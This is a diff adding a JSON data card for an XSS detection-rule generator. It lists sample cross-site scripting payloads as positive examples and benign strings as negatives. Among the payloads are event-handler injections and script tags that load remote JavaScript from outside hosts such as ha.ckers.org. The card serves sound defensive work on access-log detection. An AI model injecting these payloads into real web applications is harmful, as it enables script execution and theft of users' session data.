@@ -1,0 +1,37 @@
+{
+  "cluster_id": "XSS-SCRIPT_TAG",
+  "category": "XSS",
+  "subcategory": "SCRIPT_TAG",
+  "suggested_rule_id": "XSS-SCRIPT-001",
+  "suggested_target_field": "query",
+  "count": 261,
+  "positive_examples": [
+    "<img+src=x+onerror=prompt(1);>",
+    "<iframe id=xss src=\"javascript:alert('xss'); <",
+    "<script \"a='>'\" id=xss src=\"http://ha.ckers.org/xss.js\"></script>",
+    ">\"<style><!--</style><script>document.cookie=true;//--></script>",
+    "<script id=xss src=http://ha.ckers.org/xss.js></script>",
+    "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
+    "<iframe src=http://xss.rocks/scriptlet.html <",
+    "\"><iframe src='' onload=alert('mphone')>",
+    "><img id=xss src=x onerror=alert(xss);>",
+    "<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>",
+    "<script>alert(1);</script>",
+    "<iframe src=http://www.vulnerability-lab.com>"
+  ],
+  "negative_examples": [
+    "monino",
+    "6657407608418544",
+    "ademaro",
+    "ba46ea5",
+    "1erso",
+    "calle madagascar 130",
+    "0769789407660165",
+    "51egible"
+  ],
+  "source_datasets": [
+    "FuzzDB",
+    "HttpParamsDataset"
+  ],
+  "notes": "Use this card with ai/prompts/rule-generator.md. Emit one abstract rule JSON only. Do not paste the full corpus. Do not overfit a single payload. Rules must apply to access-log fields path/query/ua/raw — not POST body."
+}
